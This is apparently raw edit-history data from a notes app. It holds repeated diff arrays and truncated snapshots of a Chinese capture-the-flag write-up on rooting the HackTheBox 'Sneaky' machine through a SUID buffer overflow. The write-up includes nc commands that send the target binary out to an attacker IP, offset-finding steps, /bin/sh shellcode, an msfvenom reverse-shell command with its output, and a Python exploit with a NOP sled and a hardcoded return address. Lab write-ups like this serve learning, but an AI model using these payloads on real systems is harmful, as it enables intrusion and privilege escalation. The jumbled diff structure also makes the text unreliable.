c\n"]],[195,195],[2119,2119]]],[1578117334957,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2086,"="],[1,2100,"P"],[-1,2106,"="],[1,2110,"口"],[1,2113,"cf"],[-1,2113," c\n"]],[2119,2119],[195,195]]],[1578117292311,["whale@Whale",[[-1,2057,"meterprete"]],[2057,2067],[2057,2057]]],[1578117293470,["whale@Whale",[[1,2057,"shell"]],[2057,2057],[2062,2062]]],[1578117294271,["whale@Whale",[[-1,2062,"r"]],[2062,2062],[2062,2062]]],[1578117395956,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2057,"/"],[-1,2062,"r"],[1,2081,"="],[-1,2094,"P"],[1,2101,"="],[-1,2104,"口"],[-1,2108,"cf"],[1,2110," c\n"]],[195,195],[2113,2113]]],[1578117395956,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2056,"/"],[1,2062,"r"],[-1,2080,"="],[1,2094,"P"],[-1,2100,"="],[1,2104,"口"],[1,2107,"cf"],[-1,2107," c\n"]],[2113,2113],[195,195]]],[1578117381325,["whale@Whale",[[1,2110,"\n"]],[2109,2109],[2110,2110]]],[1578117381717,["whale@Whale",[[1,2111,"\n"]],[2110,2110],[2111,2111]]],[1578117456945,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2057,"/"],[-1,2062,"r"],[1,2081,"="],[-1,2094,"P"],[1,2101,"="],[-1,2104,"口"],[-1,2108,"cf"],[1,2110," c\n"]],[195,195],[2113,2113]]],[1578117456945,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2056,"/"],[1,2062,"r"],[-1,2080,"="],[1,2094,"P"],[-1,2100,"="],[1,2104,"口"],[1,2107,"cf"],[-1,2107," c\n"]],[2113,2113],[195,195]]],[1578117423239,["whale@Whale",[[1,2112,"![4]($res/4.PNG)\n\n"]],[2111,2111],[2129,2129]]],[1578117426061,["whale@Whale",[[-1,2111,"\n"]],[2111,2111],[2110,2110]]],[1578124773996,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2057,"/"],[-1,2062,"r"],[1,2081,"="],[-1,2094,"P"],[1,2101,"="],[-1,2104,"口"],[-1,2108,"cf"],[1,2110," c\n"]],[195,195],[2113,2113]]],[1578124773996,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2056,"/"],[1,2062,"r"],[-1,2080,"="],[1,2094,"P"],[-1,2100,"="],[1,2104,"口"],[1,2107,"cf"],[-1,2107," c\n"]],[2113,2113],[195,195]]],[1578124722325,["whale@Whale",[[1,2129,"\n"]],[2128,2128],[2129,2129]]],[1578124722733,["whale@Whale",[[1,2129,"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\r\n\"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x68\\x68\"\r\n\"\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\r\n\"\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\r\n\"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"]],[2129,2129],[2417,2417]]],[1578124834974,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2057,"/"],[-1,2062,"r"],[1,2081,"="],[-1,2094,"P"],[1,2101,"="],[-1,2104,"口"],[-1,2108,"cf"],[1,2110," c\n"],[-1,2190,"\r"],[1,2191,"\n"],[-1,2254,"\r"],[1,2255,"\n"],[-1,2318,"\r"],[1,2319,"\n"],[-1,2382,"\r"],[1,2383,"\n"]],[195,195],[2384,2384]]],[1578124834974,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2056,"/"],[1,2062,"r"],[-1,2080,"="],[1,2094,"P"],[-1,2100,"="],[1,2104,"口"],[1,2107,"cf"],[-1,2107," c\n"],[1,2190,"\r"],[-1,2190,"\n"],[1,2254,"\r"],[-1,2254,"\n"],[1,2318,"\r"],[-1,2318,"\n"],[1,2382,"\r"],[-1,2382,"\n"]],[2384,2384],[195,195]]],[1578124801575,["whale@Whale",[[-1,2190,"\r"],[-1,2254,"\r"],[-1,2318,"\r"],[-1,2382,"\r"],[1,2418,"\n"]],[2413,2413],[2414,2414]]],[1578124801786,["whale@Whale",[[1,2415,"\n"]],[2414,2414],[2415,2415]]],[1578124803593,["whale@Whale",[[-1,2415,"\n"],[1,2416,"## exp"]],[2415,2415],[2421,2421]]],[1578124805231,["whale@Whale",[[1,2421,"\n\nfrom struct import pack shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode +=\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode +=\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode +=\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" buffersize = 362 nop = \"\\x90\" * (buffersize - len(shellcode)) eip = pack('<L', 0xbffff85c) payload = nop + shellcode + eip print payload"]],[2421,2421],[2754,2754]]],[1578124809579,["whale@Whale",[[-1,2422,"from struct import pack shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode +=\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode +=\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode +=\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" buffersize = 362 nop = \"\\x90\" * (buffersize - len(shellcode)) eip = pack('<L', 0xbffff85c) payload = nop + shellcode + eip print payload"]],[2754,2754],[2422,2422]]],[1578125565963,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2057,"/"],[-1,2062,"r"],[1,2081,"="],[-1,2094,"P"],[1,2101,"="],[-1,2104,"口"],[-1,2108,"cf"],[1,2110," c\n"],[-1,2422,"d"],[1,2423,"\n"]],[195,195],[2424,2424]]],[1578125565963,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2035,"\n"],[-1,2056,"/"],[1,2062,"r"],[-1,2080,"="],[1,2094,"P"],[-1,2100,"="],[1,2104,"口"],[1,2107,"cf"],[-1,2107," c\n"],[1,2422,"d"],[-1,2422,"\n"]],[2424,2424],[195,195]]],[1578125560522,["whale@Whale",[[1,192,"\n"]],[191,191],[192,192]]],[1578125562333,["whale@Whale",[[1,192,"[https://chickenpwny.github.io/hackthebox/boxes/sneaky/](https://chickenpwny.github.io/hackthebox/boxes/sneaky/)"]],[192,192],[304,304]]],[1578125563721,["whale@Whale",[[1,305,"\n"]],[304,304],[305,305]]],[1578125626975,[null,[[-1,309," "],[1,315,"d"],[-1,320,"的"],[1,321," "],[-1,2149,"\n"],[1,2171,"/"],[-1,2176,"r"],[1,2195,"="],[-1,2208,"P"],[1,2215,"="],[-1,2218,"口"],[-1,2222,"cf"],[1,2224," c\n"],[-1,2536,"d"],[1,2537,"\n"]],[309,309],[2538,2538]]],[1578125626976,[null,[[1,309," "],[-1,314,"d"],[1,320,"的"],[-1,320," "],[1,2149,"\n"],[-1,2170,"/"],[1,2176,"r"],[-1,2194,"="],[1,2208,"P"],[-1,2214,"="],[1,2218,"口"],[1,2221,"cf"],[-1,2221," c\n"],[1,2536,"d"],[-1,2536,"\n"]],[2538,2538],[309,309]]],[1578125566449,["whale@Whale",[[1,115,"\n"]],[115,115],[116,116]]],[1578125567562,["whale@Whale",[[1,116,"- "]],[116,116],[118,118]]],[1578125570936,["whale@Whale",[[1,195," "]],[195,195],[196,196]]],[1578125571954,["whale@Whale",[[-1,195," "]],[196,196],[195,195]]],[1578125572667,["whale@Whale",[[1,195,"- "]],[195,195],[197,197]]],[1578125747958,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2154,"\n"],[1,2176,"/"],[-1,2181,"r"],[1,2200,"="],[-1,2213,"P"],[1,2220,"="],[-1,2223,"口"],[-1,2227,"cf"],[1,2229," c\n"],[-1,2541,"d"],[1,2542,"\n"]],[314,314],[2543,2543]]],[1578125747958,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2154,"\n"],[-1,2175,"/"],[1,2181,"r"],[-1,2199,"="],[1,2213,"P"],[-1,2219,"="],[1,2223,"口"],[1,2226,"cf"],[-1,2226," c\n"],[1,2541,"d"],[-1,2541,"\n"]],[2543,2543],[314,314]]],[1578125734639,["whale@Whale",[[1,2034,"\n"]],[2033,2033],[2034,2034]]],[1578125736166,["whale@Whale",[[1,2034,"## sou"]],[2034,2034],[2040,2040]]],[1578125736897,["whale@Whale",[[-1,2037,"sou"]],[2040,2040],[2037,2037]]],[1578125741686,["whale@Whale",[[1,2037,"搜索shellcode"]],[2037,2037],[2048,2048]]],[1578125741983,["whale@Whale",[[1,2049,"\n"]],[2048,2048],[2049,2049]]],[1578125742313,["whale@Whale",[[1,2049,"packetstorm /bin/sh shellcode"]],[2049,2049],[2078,2078]]],[1578125743280,["whale@Whale",[[1,2079,"\n"]],[2078,2078],[2079,2079]]],[1578125808950,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2200,"\n"],[1,2222,"/"],[-1,2227,"r"],[1,2246,"="],[-1,2259,"P"],[1,2266,"="],[-1,2269,"口"],[-1,2273,"cf"],[1,2275," c\n"],[-1,2587,"d"],[1,2588,"\n"]],[314,314],[2589,2589]]],[1578125808950,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2200,"\n"],[-1,2221,"/"],[1,2227,"r"],[-1,2245,"="],[1,2259,"P"],[-1,2265,"="],[1,2269,"口"],[1,2272,"cf"],[-1,2272," c\n"],[1,2587,"d"],[-1,2587,"\n"]],[2589,2589],[314,314]]],[1578125762818,["whale@Whale",[[1,2079,"```\nchar shellcode[] = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"                   \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"                   \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"                   \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";\n```"]],[2079,2079],[2284,2284]]],[1578125766767,["whale@Whale",[[1,2151,"\n"]],[2151,2151],[2152,2152]]],[1578125772002,["whale@Whale",[[1,2102,"\n"]],[2102,2102],[2103,2103]]],[1578125773671,["whale@Whale",[[1,2202,"\n"]],[2202,2202],[2203,2203]]],[1578125775399,["whale@Whale",[[1,2252,"\n"]],[2252,2252],[2253,2253]]],[1578125868950,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2409,"\n"],[1,2431,"/"],[-1,2436,"r"],[1,2455,"="],[-1,2468,"P"],[1,2475,"="],[-1,2478,"口"],[-1,2482,"cf"],[1,2484," c\n"],[-1,2796,"d"],[1,2797,"\n"]],[314,314],[2798,2798]]],[1578125868951,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2409,"\n"],[-1,2430,"/"],[1,2436,"r"],[-1,2454,"="],[1,2468,"P"],[-1,2474,"="],[1,2478,"口"],[1,2481,"cf"],[-1,2481," c\n"],[1,2796,"d"],[-1,2796,"\n"]],[2798,2798],[314,314]]],[1578125857054,["whale@Whale",[[1,2049,"\n"]],[2048,2048],[2049,2049]]],[1578125857854,["whale@Whale",[[1,2050,"\n"]],[2049,2049],[2050,2050]]],[1578125860018,["whale@Whale",[[1,2050,"uname -a"]],[2050,2050],[2058,2058]]],[1578125860758,["whale@Whale",[[1,2059,"\n"]],[2058,2058],[2059,2059]]],[1578125861235,["whale@Whale",[[1,2059,"Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux\r\n"]],[2059,2059],[2169,2169]]],[1578125928983,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2167,"\r"],[1,2168,"\n"],[-1,2530,"\n"],[1,2552,"/"],[-1,2557,"r"],[1,2576,"="],[-1,2589,"P"],[1,2596,"="],[-1,2599,"口"],[-1,2603,"cf"],[1,2605," c\n"],[-1,2917,"d"],[1,2918,"\n"]],[314,314],[2919,2919]]],[1578125928984,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2167,"\r"],[-1,2167,"\n"],[1,2530,"\n"],[-1,2551,"/"],[1,2557,"r"],[-1,2575,"="],[1,2589,"P"],[-1,2595,"="],[1,2599,"口"],[1,2602,"cf"],[-1,2602," c\n"],[1,2917,"d"],[-1,2917,"\n"]],[2919,2919],[314,314]]],[1578125871638,["whale@Whale",[[1,2050,"【目标shell运行】"],[-1,2167,"\r"]],[2050,2050],[2061,2061]]],[1578125880582,["whale@Whale",[[1,2050,"\n"]],[2049,2049],[2050,2050]]],[1578125881582,["whale@Whale",[[1,2050,"```"]],[2050,2050],[2053,2053]]],[1578125883462,["whale@Whale",[[-1,2050,"```"]],[2053,2053],[2050,2050]]],[1578125887646,["whale@Whale",[[1,2071,"\n"]],[2070,2070],[2071,2071]]],[1578125887934,["whale@Whale",[[1,2071,"```"]],[2071,2071],[2074,2074]]],[1578125891128,["whale@Whale",[[1,2184,"```"]],[2184,2184],[2187,2187]]],[1578125988985,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2548,"\n"],[1,2570,"/"],[-1,2575,"r"],[1,2594,"="],[-1,2607,"P"],[1,2614,"="],[-1,2617,"口"],[-1,2621,"cf"],[1,2623," c\n"],[-1,2935,"d"],[1,2936,"\n"]],[314,314],[2937,2937]]],[1578125988985,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2548,"\n"],[-1,2569,"/"],[1,2575,"r"],[-1,2593,"="],[1,2607,"P"],[-1,2613,"="],[1,2617,"口"],[1,2620,"cf"],[-1,2620," c\n"],[1,2935,"d"],[-1,2935,"\n"]],[2937,2937],[314,314]]],[1578125930556,["whale@Whale",[[1,2187,"s"]],[2187,2187],[2188,2188]]],[1578125931301,["whale@Whale",[[-1,2187,"s"]],[2188,2188],[2187,2187]]],[1578125932858,["whale@Whale",[[1,2187,"搜索"]],[2187,2187],[2189,2189]]],[1578125936053,["whale@Whale",[[1,2187,"\n"]],[2187,2187],[2188,2188]]],[1578125953971,["whale@Whale",[[1,2190,"i686，可得知目标机器是86位置"]],[2190,2190],[2207,2207]]],[1578125954125,["whale@Whale",[[-1,2206,"置"]],[2207,2207],[2206,2206]]],[1578125956847,["whale@Whale",[[1,2206,"的机器。"]],[2206,2206],[2210,2210]]],[1578125957213,["whale@Whale",[[1,2211,"\n"]],[2210,2210],[2211,2211]]],[1578126229007,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2572,"\n"],[1,2594,"/"],[-1,2599,"r"],[1,2618,"="],[-1,2631,"P"],[1,2638,"="],[-1,2641,"口"],[-1,2645,"cf"],[1,2647," c\n"],[-1,2959,"d"],[1,2960,"\n"]],[314,314],[2961,2961]]],[1578126229008,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2572,"\n"],[-1,2593,"/"],[1,2599,"r"],[-1,2617,"="],[1,2631,"P"],[-1,2637,"="],[1,2641,"口"],[1,2644,"cf"],[-1,2644," c\n"],[1,2959,"d"],[-1,2959,"\n"]],[2961,2961],[314,314]]],[1578126184858,["whale@Whale",[[1,2212,"google搜索关键词\"  "]],[2212,2212],[2226,2226]]],[1578126186217,["whale@Whale",[[1,2255,"\""]],[2255,2255],[2256,2256]]],[1578126187360,["whale@Whale",[[1,2255,"  "]],[2255,2255],[2257,2257]]],[1578128285970,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2589,"\n"],[1,2611,"/"],[-1,2616,"r"],[1,2635,"="],[-1,2648,"P"],[1,2655,"="],[-1,2658,"口"],[-1,2662,"cf"],[1,2664," c\n"],[-1,2976,"d"],[1,2977,"\n"]],[314,314],[2978,2978]]],[1578128285970,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2589,"\n"],[-1,2610,"/"],[1,2616,"r"],[-1,2634,"="],[1,2648,"P"],[-1,2654,"="],[1,2658,"口"],[1,2661,"cf"],[-1,2661," c\n"],[1,2976,"d"],[-1,2976,"\n"]],[2978,2978],[314,314]]],[1578128278562,["whale@Whale",[[-1,1857,"EIP地址"]],[1857,1862],[1857,1857]]],[1578128279216,["whale@Whale",[[1,1857,"fa"]],[1857,1857],[1859,1859]]],[1578128279731,["whale@Whale",[[-1,1857,"fa"]],[1859,1859],[1857,1857]]],[1578128285342,["whale@Whale",[[1,1857,"指令"]],[1857,1857],[1859,1859]]],[1578128345974,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2586,"\n"],[1,2608,"/"],[-1,2613,"r"],[1,2632,"="],[-1,2645,"P"],[1,2652,"="],[-1,2655,"口"],[-1,2659,"cf"],[1,2661," c\n"],[-1,2973,"d"],[1,2974,"\n"]],[314,314],[2975,2975]]],[1578128345975,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2586,"\n"],[-1,2607,"/"],[1,2613,"r"],[-1,2631,"="],[1,2645,"P"],[-1,2651,"="],[1,2655,"口"],[1,2658,"cf"],[-1,2658," c\n"],[1,2973,"d"],[-1,2973,"\n"]],[2975,2975],[314,314]]],[1578128289935,["whale@Whale",[[-1,1857,"指令"]],[1859,1859],[1857,1857]]],[1578128293274,["whale@Whale",[[1,1857,"返回地址（）"]],[1857,1857],[1863,1863]]],[1578128298292,["whale@Whale",[[1,1862,"缓冲区长度"]],[1862,1862],[1867,1867]]],[1578128305402,["whale@Whale",[[-1,1861,"（缓冲区长度"]],[1867,1867],[1861,1861]]],[1578128311971,["whale@Whale",[[1,1861,"（给定的缓冲区长度"]],[1861,1861],[1870,1870]]],[1578128326162,["whale@Whale",[[1,1862,"定位"]],[1862,1862],[1864,1864]]],[1578128337113,["whale@Whale",[[-1,1862,"定位"]],[1864,1864],[1862,1862]]],[1578128339511,["whale@Whale",[[1,1862,"找出"]],[1862,1862],[1864,1864]]],[1578134748986,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2600,"\n"],[1,2622,"/"],[-1,2627,"r"],[1,2646,"="],[-1,2659,"P"],[1,2666,"="],[-1,2669,"口"],[-1,2673,"cf"],[1,2675," c\n"],[-1,2987,"d"],[1,2988,"\n"]],[314,314],[2989,2989]]],[1578134748986,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2600,"\n"],[-1,2621,"/"],[1,2627,"r"],[-1,2645,"="],[1,2659,"P"],[-1,2665,"="],[1,2669,"口"],[1,2672,"cf"],[-1,2672," c\n"],[1,2987,"d"],[-1,2987,"\n"]],[2989,2989],[314,314]]],[1578134736804,["whale@Whale",[[1,1290,"\n"]],[1289,1289],[1290,1290]]],[1578134737611,["whale@Whale",[[1,1290,"[https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html)"]],[1290,1290],[1422,1422]]],[1578134743035,["whale@Whale",[[-1,1291,"https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.htm"]],[1291,1354],[1291,1291]]],[1578134746333,["whale@Whale",[[1,1291,"gdb用法"]],[1291,1291],[1296,1296]]],[1578134747121,["whale@Whale",[[-1,1296,"l"]],[1296,1296],[1296,1296]]],[1578135049001,[null,[[-1,314," "],[1,320,"d"],[-1,325,"的"],[1,326," "],[-1,2674,"\n"],[1,2696,"/"],[-1,2701,"r"],[1,2720,"="],[-1,2733,"P"],[1,2740,"="],[-1,2743,"口"],[-1,2747,"cf"],[1,2749," c\n"],[-1,3061,"d"],[1,3062,"\n"]],[314,314],[3063,3063]]],[1578135049001,[null,[[1,314," "],[-1,319,"d"],[1,325,"的"],[-1,325," "],[1,2674,"\n"],[-1,2695,"/"],[1,2701,"r"],[-1,2719,"="],[1,2733,"P"],[-1,2739,"="],[1,2743,"口"],[1,2746,"cf"],[-1,2746," c\n"],[1,3061,"d"],[-1,3061,"\n"]],[3063,3063],[314,314]]],[1578134994327,["whale@Whale",[[-1,1926,"## 定位返回地址（找出给定的缓冲区长度）"]],[1926,1947],[1926,1926]]],[1578134996081,["whale@Whale",[[-1,1927,"\n"]],[1926,1926],[1925,1925]]],[1578135012015,["whale@Whale",[[1,311,"\n"]],[310,310],[311,311]]],[1578135013275,["whale@Whale",[[1,311,"名词解释\r\n函数返回地址：保存当前函数调用前的信息，一边函数返回时能够回复到函数被调用前的代码区\r\n中继续执行指令。\r\nEIP: 指令寄存器，指向下一条等待执行的指令地址。"]],[311,311],[397,397]]],[1578135017809,["whale@Whale",[[1,311,"》"],[-1,315,"\r"],[-1,359,"\r"],[-1,311,"》\r"]],[311,311],[311,311]]],[1578135018597,["whale@Whale",[[1,311,">"]],[311,311],[312,312]]],[1578135021519,["whale@Whale",[[1,396,"\n"]],[395,395],[396,396]]]]],["5ee227f0-c517-4cf7-845c-9ce193d251ad",1578229275094,"Sneaky（suid+缓冲区溢出提权）\n===\n\n上一篇：[Sneaky(snmp默认口令泄露敏感信息)](https://whale3070.github.io/training/2019/10/26/07-x/)\n参考资料：\n- [缓冲区溢出案例（一）](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)\n- [https://chickenpwny.github.io/hackthebox/boxes/sneaky/](https://chickenpwny.github.io/hackthebox/boxes/sneaky/)\n\n>名词解释\n函数返回地址：保存当前函数调用前的信息，一边函数返回时能够回复到函数被调用前的代码区\n中继续执行指令。\nEIP: 指令寄存器，指向下一条等待执行的指令地址。\n\n## 找到suid权限的程序 \n```\nfind / -perm -4000 2>/dev/null > examSUID.txt\n```\n## 让该程序报错，证明可能有bof漏洞\n`python -c \"print 'A'*500\"`\n\n![1]($res/1.PNG)\n\n```\n/usr/local/bin/chal $(python -c \"print 'A'*500\") \nSegmentation fault (core dumped)\n```\n##  nc下载程序到本地进行分析 \n【kali运行】`nc -lnvp 8000 > chal`\n【目标shell运行】`nc 10.10.14.8 8000 < /usr/local/bin/chal`\n\n## 定位EIP地址\n\n** 生成500字节字符串**\n```\nlocate pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500\n\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\n```\n**gdb调试该程序**\n\n[gdb用法](https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html)\n```\ngdb -q chal\nrun Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\n```\n![2]($res/2.PNG)\n\n\n得到一个地址0x316d4130\n\n\n```\nlocate pattern_offset.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 500 -q 316d4130\n```\n![3]($res/3.PNG)\n\noffset 362， 现在我们知道了第362就是要覆盖的返回地址。\n\n## 搜索shellcode\n\n\n【目标shell运行】uname -a\n```\nLinux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux\n```\n搜索i686，可得知目标机器是86位的机器。\n\ngoogle搜索关键词\"  packetstorm /bin/sh shellcode  \"\n```\nchar shellcode[] = \n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"                   \n\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"                   \n\"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"                   \n\"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\";\n```\n## 生成shellcode\n参考资料：[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)\n\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.104 LPORT=443 -f c\n\n![4]($res/4.PNG)\n\n\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\n\"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x68\\x68\"\n\"\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\n\"\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"\n\"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\n\n## exp\n\n",[[1578229274226,["whale@Whale",[[-1,2199,"\n"]],[2199,2199],[2198,2198]]]]],["d027c066-bfa4-46f3-af6f-0436cbb8736c",1578274027564,"Sneaky（suid+缓冲区溢出提权）\n===\n\n上一篇：[Sneaky(snmp默认口令泄露敏感信息)](https://whale3070.github.io/training/2019/10/26/07-x/)\n参考资料：\n- [缓冲区溢出案例（一）](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)\n- [https://chickenpwny.github.io/hackthebox/boxes/sneaky/](https://chickenpwny.github.io/hackthebox/boxes/sneaky/)\n\n>名词解释\n函数返回地址：保存当前函数调用前的信息，一边函数返回时能够回复到函数被调用前的代码区\n中继续执行指令。\nEIP: 指令寄存器，指向下一条等待执行的指令地址。\n\n## 找到suid权限的程序 \n```\nfind / -perm -4000 2>/dev/null > examSUID.txt\n```\n## 让该程序报错，证明可能有bof漏洞\n`python -c \"print 'A'*500\"`\n\n![1]($res/1.PNG)\n\n```\n/usr/local/bin/chal $(python -c \"print 'A'*500\") \nSegmentation fault (core dumped)\n```\n##  nc下载程序到本地进行分析 \n【kali运行】`nc -lnvp 8000 > chal`\n【目标shell运行】`nc 10.10.14.8 8000 < /usr/local/bin/chal`\n\n## 定位EIP地址\n\n** 生成500字节字符串**\n```\nlocate pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 